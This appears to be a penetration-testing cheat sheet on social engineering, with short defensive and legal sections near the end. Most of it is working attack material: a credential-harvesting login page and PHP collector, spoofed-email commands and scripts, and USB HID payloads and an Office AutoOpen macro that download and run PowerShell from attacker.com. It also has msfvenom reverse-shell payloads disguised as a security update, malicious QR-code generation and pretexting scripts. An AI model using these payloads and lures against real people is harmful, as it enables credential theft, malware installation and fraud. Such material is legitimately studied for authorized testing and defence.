# Social Engineering

## Overview

Social engineering involves manipulating people into divulging confidential information or performing actions that compromise security.

**IMPORTANT**: Social engineering attacks must ONLY be performed as part of authorized security assessments with explicit written permission.

---

## Types of Social Engineering

### 1. Phishing
Email-based attacks to steal credentials or install malware.

### 2. Spear Phishing
Targeted phishing against specific individuals or organizations.

### 3. Whaling
Phishing attacks targeting high-profile executives.

### 4. Vishing (Voice Phishing)
Phone-based social engineering attacks.

### 5. Smishing (SMS Phishing)
Text message-based attacks.

### 6. Pretexting
Creating a fabricated scenario to obtain information.

### 7. Baiting
Offering something enticing to exploit victim's curiosity/greed.

### 8. Quid Pro Quo
Offering a service in exchange for information.

### 9. Tailgating/Piggybacking
Physical unauthorized access by following authorized person.

### 10. Dumpster Diving
Searching through trash for sensitive information.

---

## Phishing Campaigns

### Social Engineering Toolkit (SET)
```bash
# Start SET
setoolkit

# Menu options:
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
      1) Perform a Mass Email Attack
      2) Create a FileFormat Payload
      3) Create a Social-Engineering Template

# Credential Harvester
1) Social-Engineering Attacks
   2) Website Attack Vectors
      3) Credential Harvester Attack Method
      2) Site Cloner

# Enter URL to clone (e.g., https://facebook.com)
# Victims will be redirected to cloned site
# Credentials captured to SET output
```

### Gophish
```bash
# Install Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish

# Access web interface: https://localhost:3333
# Default credentials: admin:gophish

# Campaign workflow:
1. Create Sending Profile (SMTP settings)
2. Create Email Template
3. Create Landing Page
4. Create User Group (targets)
5. Launch Campaign
```

### King Phisher
```bash
# Install
apt-get install king-phisher

# Start server
king-phisher-server

# Start client
king-phisher-client

# Features:
- Email templates
- SMS campaigns
- Visit tracking
- Credential harvesting
- Detailed analytics
```

### Custom Phishing
```html
<!-- Basic credential harvester -->
<!DOCTYPE html>
<html>
<head>
    <title>Login Required</title>
</head>
<body>
    <h2>Session Expired - Please Login</h2>
    <form action="harvest.php" method="POST">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

```php
<?php
// harvest.php - Credential collector
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "Date: $date | IP: $ip | Username: $username | Password: $password\n";
file_put_contents('harvested.txt', $data, FILE_APPEND);

// Redirect to real site
header('Location: https://legitimate-site.com');
?>
```

---

## Email Spoofing

### Simple SMTP
```bash
# Check SPF, DKIM, DMARC
dig txt domain.com
dig txt _dmarc.domain.com

# Send spoofed email with sendemail
sendemail -f ceo@target.com -t victim@target.com -u "Urgent: Password Reset Required" -m "Please reset your password at: http://phishing-site.com" -s smtp.server.com

# Or with swaks
swaks --to victim@target.com --from ceo@target.com --header "Subject: Urgent" --body "Click here: http://phishing-site.com" --server smtp.server.com
```

### Advanced Email Spoofing
```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Email configuration
sender = "ceo@target.com"
recipient = "victim@target.com"
subject = "Urgent: Account Verification"

# Create message
msg = MIMEMultipart('alternative')
msg['Subject'] = subject
msg['From'] = sender
msg['To'] = recipient

html = """
<html>
  <body>
    <p>Dear Employee,</p>
    <p>Please verify your account by clicking the link below:</p>
    <a href="http://phishing-site.com/verify">Verify Account</a>
    <p>IT Department</p>
  </body>
</html>
"""

msg.attach(MIMEText(html, 'html'))

# Send email
server = smtplib.SMTP('smtp.server.com', 587)
server.starttls()
server.sendmail(sender, recipient, msg.as_string())
server.quit()
```

---

## Vishing (Voice Phishing)

### Techniques
```
1. Impersonation
   - IT support
   - Bank representative
   - Government official
   - Manager/executive

2. Creating urgency
   - "Your account will be suspended"
   - "Security breach detected"
   - "Immediate action required"

3. Social proof
   - "Everyone in your department has already..."
   - "This is company policy..."

4. Authority
   - "This is [Executive Name]..."
   - "I'm calling from [Trusted Organization]..."
```

### VoIP Tools
```bash
# SpoofCard (commercial)
# Change caller ID

# Asterisk
# Create custom IVR system

# FreeSWITCH
# Open-source telephony platform
```

---

## Physical Social Engineering

### Pretexting Scenarios
```
1. IT Support
   - "We're upgrading systems, need your password"
   - "Troubleshooting network issues"
   - "Installing security update"

2. Delivery Person
   - Carrying packages
   - "Need signature inside"

3. Maintenance/Contractor
   - Wearing uniform
   - Carrying tools/equipment

4. Vendor/Visitor
   - "Here for meeting with [Name]"
   - "Scheduled maintenance"

5. Emergency
   - "Fire alarm test"
   - "Building evacuation"
```

### Tailgating
```
Techniques:
1. Carrying boxes/equipment (hands full)
2. Wearing uniform/lanyard
3. Following closely behind authorized person
4. Asking to "hold the door"
5. Pretending to forget badge
6. Creating distraction

Prevention:
- Security awareness training
- Security guards
- Turnstiles
- Badge readers requiring individual authentication
- Challenge unfamiliar people
```

---

## USB Drop Attacks

### Rubber Ducky
```
# BadUSB device that emulates keyboard
# Ducky Script example

DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
```

### Bash Bunny
```bash
# More advanced than Rubber Ducky
# Can emulate multiple devices
# Example payload

LED ATTACK
ATTACKMODE HID STORAGE
RUN WIN "cmd /c start powershell -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\""
```

### Creating Malicious USB
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o update.exe

# Copy to USB with autorun
# autorun.inf
[autorun]
open=update.exe
action=Run Security Update
icon=update.exe

# Or use Social Engineering Toolkit
setoolkit
# 3) Infectious Media Generator
```

---

## OSINT for Social Engineering

### Information Gathering
```bash
# LinkedIn
- Employee names and positions
- Company structure
- Email format
- Technologies used
- Recent hires/departures

# Company website
- Email addresses
- Employee names
- Phone numbers
- Office locations

# Social media
- Personal information
- Interests/hobbies
- Relationships
- Vacation schedules

# theHarvester
theharvester -d target.com -b all

# Maltego
# Visual link analysis

# SpiderFoot
spiderfoot -s target.com
```

### Building Target Profile
```
Information to gather:
- Full name
- Job title
- Email address
- Phone number
- Manager/colleagues
- Interests/hobbies
- Education
- Recent activities
- Technologies they use
- Common passwords patterns
```

---

## Psychological Manipulation Techniques

### 1. Authority
```
People tend to obey authority figures
- Use titles (Dr., CEO, Manager)
- Mention high-ranking officials
- Display confidence
```

### 2. Urgency/Scarcity
```
Creating time pressure
- "Immediate action required"
- "Limited time offer"
- "Account will be suspended"
```

### 3. Social Proof
```
People follow what others do
- "Everyone else has already..."
- "This is standard procedure"
- "Your colleagues have completed this"
```

### 4. Liking/Similarity
```
People say yes to people they like
- Find common ground
- Build rapport
- Mirror language/behavior
```

### 5. Reciprocity
```
People feel obligated to return favors
- Offer help first
- Give something small
- Create sense of debt
```

### 6. Commitment/Consistency
```
People stick to their commitments
- Get small agreement first
- Build on previous agreements
- Reference past actions
```

---

## Malicious Attachments

### Office Macros
```vb
' Malicious Word macro
Sub AutoOpen()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"""
End Sub
```

### PDF Exploits
```bash
# Generate malicious PDF
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe

# Embed in PDF using SET or other tools
# Or exploit known PDF vulnerabilities
```

### Malicious Links
```
URL shorteners to hide destination:
- bit.ly
- tinyurl.com
- goo.gl

URL encoding:
- http://target.com@attacker.com
- http://attacker.com/target.com

Homograph attacks (Unicode):
- аррӏе.com (Cyrillic characters)
- paypal.com vs pаypal.com
```

---

## Watering Hole Attacks

```
Concept: Compromise websites frequently visited by targets

1. Identify target organization
2. Determine websites they visit
   - Industry news sites
   - Professional forums
   - Vendor sites
3. Compromise one of these sites
4. Inject malicious code
5. Wait for targets to visit
6. Exploit delivered to targets
```

---

## QR Code Attacks

```bash
# Generate malicious QR code
# Install qrencode
apt-get install qrencode

# Create QR code with malicious URL
qrencode -o malicious_qr.png "http://attacker.com/payload"

# Or phishing page
qrencode -o phishing_qr.png "http://attacker.com/fake-login"

# Users scan QR code thinking it's legitimate
```

---

## Social Engineering Red Flags

### For Defenders:
```
1. Unsolicited communications
2. Requests for sensitive information
3. Urgent/threatening language
4. Spelling/grammar errors
5. Mismatched URLs
6. Suspicious attachments
7. Requests to bypass security
8. Unusual sender addresses
9. Generic greetings
10. Too good to be true offers
```

---

## Social Engineering Tools

### Frameworks
- Social Engineering Toolkit (SET)
- Gophish
- King Phisher
- Evilginx2 (phishing framework)

### Information Gathering
- theHarvester
- Maltego
- SpiderFoot
- Recon-ng
- Sherlock

### Email
- Swaks
- Sendemail
- PHPMailer

### Physical
- Rubber Ducky
- Bash Bunny
- Proxmark3 (RFID cloning)

---

## Reporting Social Engineering Tests

### Include:
1. Executive summary
2. Test methodology
3. Attack scenarios used
4. Success/failure rates
5. User awareness levels
6. Compromised credentials/access
7. Recommendations
8. Security awareness training needs

---

## Social Engineering Prevention

### Technical Controls
1. Email filtering
2. SPF/DKIM/DMARC
3. Anti-phishing tools
4. Web filtering
5. Endpoint protection
6. MFA enforcement
7. USB port restrictions

### Administrative Controls
1. Security awareness training
2. Phishing simulations
3. Clear reporting procedures
4. Verification procedures
5. Incident response plan
6. Access control policies

### Physical Controls
1. Badge systems
2. Security guards
3. Visitor logs
4. CCTV
5. Secure disposal
6. Clean desk policy

---

## Security Awareness Training Topics

```
1. Phishing identification
2. Password security
3. Physical security
4. Social engineering tactics
5. Incident reporting
6. Data classification
7. Clean desk policy
8. Removable media handling
9. Visitor handling
10. Verification procedures
```

---

## Legal and Ethical Considerations

**CRITICAL REMINDERS:**

1. **Written Authorization** - Always required
2. **Scope Definition** - Clear boundaries
3. **Rules of Engagement** - What's allowed/forbidden
4. **Data Handling** - Proper storage/destruction
5. **Timing** - When attacks can occur
6. **Reporting** - Immediate notification procedures
7. **Liability** - Insurance and legal protection

---

## Further Reading

- The Art of Deception (Kevin Mitnick)
- Social Engineering: The Science of Human Hacking (Christopher Hadnagy)
- Influence: The Psychology of Persuasion (Robert Cialdini)
- Social Engineering Penetration Testing (OWASP)
